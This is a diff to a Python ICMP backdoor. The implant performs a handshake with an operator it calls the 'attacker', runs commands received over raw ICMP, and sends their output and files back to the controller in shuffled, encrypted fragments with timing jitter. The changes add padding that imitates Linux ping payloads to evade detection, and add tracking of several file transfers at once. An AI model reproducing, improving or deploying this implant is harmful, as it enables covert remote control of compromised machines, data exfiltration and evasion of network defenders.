@@ -21,7 +21,7 @@ is_echo = False
 ICMP_ID = 0x1111
 DEFAULT_SHIFT_VALUE = 1
 DEFAULT_RAILFENCE_RAILS = 4
-DEFAULT_BIT_RAILFENCE_RAILS = 7
+DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set >=2
 HANDSHAKE_PREFIX = b"SYNC:"
 ACK_PREFIX = b"ACK:"
 PROBE_COMMAND = b"probe"  
@@ -33,9 +33,6 @@ PADDING_MIN = 1
 PADDING_MAX = 5
 REDUNDANCY_FACTOR = 0.1  
 FRAG_TIMEOUT = 60  
-
-frag_queue = []
-current_frag_id = None
 
 def apply_blocking_rules(family, rep_type):
     if family == socket.AF_INET:
@@ -217,6 +214,32 @@ def substitution_decrypt(data, table):
 def reverse_data(data):
     return data[::-1]
 
+def generate_linux_mimic_padding(length, seed):
+    random.seed(seed)
+    padding = bytearray()
+    while len(padding) < length:
+        r = random.random()
+        if r < 0.45:
+            run_len = random.randint(6, 24)
+            padding.extend(b'\x00' * run_len)
+        elif r < 0.70:
+            start = random.randint(0x08, 0x50)
+            run_len = random.randint(8, 32)
+            padding.extend(bytes(range(start, start + run_len)))
+        elif r < 0.85:
+            patterns = [
+                b'0123456789' * 6,
+                b'abcdefghijklmnopqrstuvwabcdefghi' * 2,
+                struct.pack('!I', random.randint(0, 0xffffffff)) * random.randint(3, 6),
+            ]
+            pat = random.choice(patterns)
+            padding.extend(pat[:random.randint(12, 36)])
+        else:
+            chunk = random.randbytes(random.randint(4, 12))
+            chunk = bytes(b & 0x7F if random.random() < 0.8 else b for b in chunk)
+            padding.extend(chunk)
+    return bytes(padding[:length])
+
 def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
     pre_redun_len = len(data)
     redundancy_len = int(pre_redun_len * REDUNDANCY_FACTOR)
@@ -248,25 +271,11 @@ def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT
         random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
         if random.random() < 0.5:
             data = minor_funcs[op](data)
-    ent = calculate_entropy(data)
-    extra_pad_len = 0
-    chunk_size = 8
-    low_block = bytes(0x08 + i for i in range(chunk_size))
-    max_extra = len(data) // 2
-    extra_pad = b''
-    while (ent > 6 or ent < 4) and extra_pad_len < max_extra:
-        extra_pad_len += chunk_size
-        if ent > 6:
-            temp_pad = low_block * (extra_pad_len // chunk_size) + low_block[:extra_pad_len % chunk_size]
-        else:
-            random.seed(padding_seed if padding_seed is not None else 0)
-            temp_pad = bytes(random.randint(0, 255) for _ in range(extra_pad_len))
-        tentative = data + temp_pad
-        ent = calculate_entropy(tentative)
-        extra_pad = temp_pad
-    if ent > 6 or ent < 4:
-        pass
-    data = struct.pack('!H', len(data)) + data + extra_pad
+    data = struct.pack('!H', len(data)) + data
+    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
+    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
+    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
+    data += mimic
     return data
 
 def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
@@ -303,7 +312,6 @@ def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_r
     return data
 
 def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
-    
     layer_funcs = {
         'reverse': reverse_data,
         'railfence': lambda d: railfence_encrypt(d, railfence_rails),
@@ -323,10 +331,20 @@ def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_V
         random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
         if random.random() < 0.5:
             data = minor_funcs[op](data)
+    data = struct.pack('!H', len(data)) + data
+    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
+    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
+    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
+    data += mimic
     return data
 
 def light_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
-    
+    if len(data) < 2:
+        return b''
+    original_len = struct.unpack('!H', data[:2])[0]
+    if len(data) < 2 + original_len:
+        return b''
+    data = data[2:2 + original_len]
     selected = [op for op in selected_ops or [] if op != 'noise']
     minor_inverse_funcs = {
         'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
@@ -534,7 +552,7 @@ def send_ack(controller_ip, rep_type, icmp_id, seq, padding_seed, sub_table, shi
     send_packet(controller_ip, rep_type, icmp_id, seq, encrypted_payload, family, proto, poly_seed, mutation_count)
 
 def send_output(controller_ip, output, orig_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=False, poly_seed=None, mutation_count=3, delay_mode=None, delay_min=1, delay_max=3, layers=None, selected_ops=None):
-    global frag_queue, current_frag_id
+    global frag_transfers
     actual_payload = out_prefix + output.encode('utf-8')
 
     force_frag = is_file
@@ -562,8 +580,11 @@ def send_output(controller_ip, output, orig_seq, rep_type, icmp_id, out_prefix, 
         frags_with_num = list(enumerate(frags))
         random.seed(padding_seed + len(data))
         random.shuffle(frags_with_num)
-        frag_queue = frags_with_num
-        current_frag_id = frag_id
+        frag_transfers[frag_id] = {
+            'frags': frags_with_num,
+            'sent': 0,
+            'last_sent': time.time()
+        }
 
         if force_frag and time.time() - pause_timer > 900:
             pause_dur = random.uniform(60, 180)
@@ -575,7 +596,7 @@ def send_output(controller_ip, output, orig_seq, rep_type, icmp_id, out_prefix, 
         send_packet(controller_ip, rep_type, icmp_id, orig_seq, encrypted_payload, family, proto, poly_seed, mutation_count)
 
 def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
-    global frag_queue, current_frag_id
+    global frag_transfers
     handshake_done = False
     cmd_prefix = None
     out_prefix = None
@@ -591,6 +612,8 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
     delay_max = 3
     layers = None
     selected_ops = None
+    controller_ip = None
+    frag_transfers = {}
     frag_buffers = {}
     with socket.socket(family, socket.SOCK_RAW, proto) as sock:
         while True:
@@ -622,6 +645,7 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                         if payload.startswith(HANDSHAKE_PREFIX):
                             seed = payload[len(HANDSHAKE_PREFIX):].decode('utf-8', errors='ignore').strip()
                             cmd_prefix, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops = derive_prefixes(seed)
+                            controller_ip = addr[0]
                             send_ack(addr[0], rep_type, icmp_id, pkt_seq, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops)
                             handshake_done = True
                             print(f"Handshake complete with attacker {addr[0]}")
@@ -705,15 +729,20 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                         output = str(e)
                                     send_output(addr[0], output, pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                         else:
-                            
-                            if current_frag_id is not None and frag_queue:
-                                num, frag_data = frag_queue.pop(0)
-                                frag_payload = out_prefix + FRAG_PREFIX + struct.pack('!4sI', current_frag_id, num) + frag_data
-                                encrypted_frag = light_encrypt(frag_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
-                                time.sleep(compute_delay(delay_mode, delay_min, delay_max))
-                                send_packet(addr[0], rep_type, icmp_id, pkt_seq, encrypted_frag, family, proto, poly_seed, mutation_count)
-                                if not frag_queue:
-                                    current_frag_id = None
+                            if controller_ip is not None and addr[0] == controller_ip and frag_transfers:
+                                for fid in list(frag_transfers.keys()):
+                                    trans = frag_transfers[fid]
+                                    if trans['sent'] < len(trans['frags']):
+                                        num, frag_data = trans['frags'][trans['sent']]
+                                        frag_payload = out_prefix + FRAG_PREFIX + struct.pack('!4sI', fid, num) + frag_data
+                                        encrypted_frag = light_encrypt(frag_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
+                                        time.sleep(compute_delay(delay_mode, delay_min, delay_max))
+                                        send_packet(addr[0], rep_type, icmp_id, pkt_seq, encrypted_frag, family, proto, poly_seed, mutation_count)
+                                        trans['sent'] += 1
+                                        trans['last_sent'] = time.time()
+                                        if trans['sent'] == len(trans['frags']):
+                                            del frag_transfers[fid]
+                                        break
             for fid in list(frag_buffers.keys()):
                 if time.time() - frag_buffers[fid]['ts'] > FRAG_TIMEOUT:
                     del frag_buffers[fid]
@@ -830,3 +859,4 @@ if __name__ == "__main__":
             sys.exit(1)
 
     main(req_type, rep_type, args.id, family, proto)
+
